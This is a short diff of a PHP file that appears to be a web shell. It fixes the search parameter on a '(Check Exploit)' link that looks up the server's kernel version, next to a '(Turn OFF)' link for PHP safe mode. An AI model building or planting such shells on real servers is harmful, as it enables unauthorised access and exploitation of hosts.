@@ -470,7 +470,7 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 								?>
 								<?php
 
-								echo "uname -a : ".php_uname()." <a href='https://google.com/?s=".php_uname()."'>(Check Exploit)</a><br />"; 	
+								echo "uname -a : ".php_uname()." <a href='https://google.com/?q=".php_uname()."'>(Check Exploit)</a><br />"; 	
 								
 								if(ini_get('safe_mode') == '1'){
 									echo 'Safe mode:<font color="red"> ON </font> <a href="?turnoff=">(Turn OFF)</a> <br />';
